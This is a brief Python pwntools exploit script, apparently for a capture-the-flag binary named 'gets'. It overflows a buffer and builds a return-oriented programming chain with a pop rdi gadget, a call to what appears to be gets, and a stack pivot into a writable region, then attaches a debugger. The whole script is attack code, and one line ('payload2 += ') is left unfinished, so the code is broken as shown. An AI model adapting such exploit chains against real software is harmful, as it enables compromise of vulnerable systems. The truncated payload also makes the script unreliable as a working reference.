from pwn import *

p = process('./gets')
elf = ELF('gets')

offset = 0x18
pop_di = 0x4005a3
pop_sp = 0x40059d
base_addr = 0x601010+0x400

payload = 'A'*offset + p64(pop_di) + p64(base_addr)
payload += p64(0x400410) + p64(pop_sp)
payload += p64(base_addr)
gdb.attach(p)
p.sendline(payload)

sleep(1)
payload2 = p64(0x0)*3
payload2 += 
p.sendline(payload2)

p.interactive()
